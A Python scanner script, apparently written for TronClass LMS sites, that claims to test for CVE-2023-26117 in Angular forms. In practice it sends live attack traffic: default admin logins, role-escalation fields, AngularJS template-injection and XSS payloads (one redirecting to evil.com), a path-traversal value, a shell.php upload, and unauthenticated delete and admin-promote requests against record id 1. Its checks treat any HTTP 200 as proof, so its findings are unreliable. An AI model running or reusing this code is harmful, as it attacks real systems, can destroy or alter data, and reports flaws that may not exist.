"""
CVE-2023-26117 Vulnerability Detection Script
Angular forms vulnerability detection for TronClass LMS
"""

import requests
import json
from urllib.parse import urljoin

def scan(session, target_url):
    """
    Scan for CVE-2023-26117 vulnerability
    Angular forms and input validation vulnerability
    """
    result = {
        'vulnerable': False,
        'evidence': '',
        'description': 'CVE-2023-26117: Angular forms input validation and processing vulnerability',
        'remediation': 'Update Angular forms to latest version and implement proper input validation'
    }
    
    try:
        # Check for Angular forms usage
        response = session.get(target_url, timeout=30)
        
        angular_forms_indicators = [
            'angular-forms',
            '@angular/forms',
            'FormControl',
            'FormGroup',
            'FormBuilder',
            'ReactiveFormsModule',
            'FormsModule',
            'ng-model',
            'ngModel',
            'formControl',
            'formGroup'
        ]
        
        uses_angular_forms = any(indicator in response.text for indicator in angular_forms_indicators)
        
        if not uses_angular_forms:
            result['evidence'] = "Angular forms not detected"
            return result
        
        # Test for form validation bypass
        form_endpoints = [
            '/register',
            '/login',
            '/profile',
            '/contact',
            '/feedback',
            '/quiz',
            '/assignment',
            '/course/create',
            '/user/update'
        ]
        
        validation_bypass_payloads = [
            {'email': 'invalid-email', 'password': '123'},
            {'email': '', 'password': ''},
            {'email': 'test@test.com', 'password': 'a'},
            {'email': 'test@test.com', 'password': 'x' * 1000},
            {'username': '<script>alert(1)</script>', 'password': 'test'},
            {'username': 'admin', 'password': 'admin'},
            {'username': 'test', 'password': 'test', 'role': 'admin'},
            {'username': 'test', 'password': 'test', 'isAdmin': True}
        ]
        
        for endpoint in form_endpoints:
            for payload in validation_bypass_payloads:
                try:
                    response = session.post(
                        urljoin(target_url, endpoint),
                        data=payload,
                        timeout=30
                    )
                    
                    # Check for successful form submission despite invalid data
                    success_indicators = [
                        'success',
                        'welcome',
                        'dashboard',
                        'profile',
                        'registered',
                        'updated',
                        'created',
                        'submitted'
                    ]
                    
                    if any(indicator in response.text.lower() for indicator in success_indicators):
                        result['vulnerable'] = True
                        result['evidence'] = f"Form validation bypass detected at {endpoint} with payload: {payload}"
                        return result
                        
                except:
                    continue
        
        # Test for Angular reactive forms vulnerabilities
        reactive_form_payloads = [
            {'formData': '{"username": "admin", "password": "admin"}'},
            {'formData': '{"role": "admin"}'},
            {'formData': '{"isAdmin": true}'},
            {'formData': '{"permissions": ["admin"]}'}
        ]
        
        for endpoint in form_endpoints:
            for payload in reactive_form_payloads:
                try:
                    headers = {'Content-Type': 'application/json'}
                    response = session.post(
                        urljoin(target_url, endpoint),
                        json=payload,
                        headers=headers,
                        timeout=30
                    )
                    
                    if response.status_code == 200:
                        result['vulnerable'] = True
                        result['evidence'] = f"Reactive forms vulnerability detected at {endpoint} with payload: {payload}"
                        return result
                        
                except:
                    continue
        
        # Test for template-driven forms vulnerabilities
        template_form_endpoints = [
            '/api/form/submit',
            '/api/form/validate',
            '/form/process'
        ]
        
        template_payloads = [
            {'ngModel': '{{constructor.constructor("alert(1)")()}}'},
            {'ngModel': '{{$eval("alert(1)")}}'},
            {'formControl': '{{7*7}}'},
            {'value': '{{constructor.constructor("location.href=\'http://evil.com\'")()}}'}
        ]
        
        for endpoint in template_form_endpoints:
            for payload in template_payloads:
                try:
                    response = session.post(
                        urljoin(target_url, endpoint),
                        data=payload,
                        timeout=30
                    )
                    
                    # Check for template injection execution
                    if '49' in response.text and '{{7*7}}' in str(payload):
                        result['vulnerable'] = True
                        result['evidence'] = f"Template injection in forms detected at {endpoint} with payload: {payload}"
                        return result
                        
                except:
                    continue
        
        # Test for FormArray vulnerabilities
        form_array_payloads = [
            {'items': [{'name': 'test', 'value': '{{constructor.constructor("alert(1)")()}}'}]},
            {'items': [{'name': 'test', 'value': '<script>alert(1)</script>'}]},
            {'formArray': '[{"role": "admin"}]'}
        ]
        
        for endpoint in form_endpoints:
            for payload in form_array_payloads:
                try:
                    headers = {'Content-Type': 'application/json'}
                    response = session.post(
                        urljoin(target_url, endpoint),
                        json=payload,
                        headers=headers,
                        timeout=30
                    )
                    
                    if response.status_code == 200:
                        result['vulnerable'] = True
                        result['evidence'] = f"FormArray vulnerability detected at {endpoint} with payload: {payload}"
                        return result
                        
                except:
                    continue
        
        # Test for custom validator bypass
        validator_bypass_payloads = [
            {'email': 'test@test.com', 'confirmEmail': 'different@test.com'},
            {'password': 'weak', 'confirmPassword': 'weak'},
            {'age': -1},
            {'age': 999},
            {'phone': 'not-a-phone'},
            {'url': 'javascript:alert(1)'},
            {'file': '../../../etc/passwd'}
        ]
        
        for payload in validator_bypass_payloads:
            try:
                response = session.post(
                    urljoin(target_url, '/register'),
                    data=payload,
                    timeout=30
                )
                
                if response.status_code == 200 and 'success' in response.text.lower():
                    result['vulnerable'] = True
                    result['evidence'] = f"Custom validator bypass detected with payload: {payload}"
                    return result
            except:
                continue
        
        # Test for file upload form vulnerabilities
        file_upload_endpoints = ['/upload', '/profile/avatar', '/course/material']
        
        for endpoint in file_upload_endpoints:
            try:
                malicious_file = ('shell.php', '<?php echo "vulnerable"; ?>', 'text/plain')
                files = {'file': malicious_file}
                
                response = session.post(
                    urljoin(target_url, endpoint),
                    files=files,
                    timeout=30
                )
                
                if 'uploaded' in response.text.lower() or 'success' in response.text.lower():
                    result['vulnerable'] = True
                    result['evidence'] = f"File upload form vulnerability detected at {endpoint}"
                    return result
            except:
                continue
        
        # Test for CSRF in forms
        csrf_endpoints = ['/api/user/delete', '/api/course/delete', '/admin/user/promote']
        
        for endpoint in csrf_endpoints:
            try:
                # Test without CSRF token
                response = session.post(
                    urljoin(target_url, endpoint),
                    data={'id': '1'},
                    timeout=30
                )
                
                if response.status_code == 200 and 'success' in response.text.lower():
                    result['vulnerable'] = True
                    result['evidence'] = f"CSRF vulnerability in forms detected at {endpoint}"
                    return result
            except:
                continue
                
    except Exception as e:
        result['evidence'] = f"Error during scan: {str(e)}"
    
    return result